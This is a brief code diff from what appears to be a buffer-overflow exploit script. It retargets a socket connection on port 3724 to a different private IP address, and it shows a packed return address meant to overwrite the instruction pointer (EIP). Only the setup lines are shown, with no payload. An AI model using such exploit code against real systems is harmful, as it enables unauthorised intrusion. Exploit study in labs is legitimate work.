@@ -6,7 +6,8 @@ import time
 
 s = socket.socket()
 # s.connect(("localhost", 3724))
-s.connect(("192.168.122.216", 3724))
+# s.connect(("192.168.122.216", 3724))
+s.connect(("192.168.1.102", 3724))
 
 # new_eip = struct.pack("<I", 0x00401489)
 new_eip = struct.pack("<I", 0x0804956e)
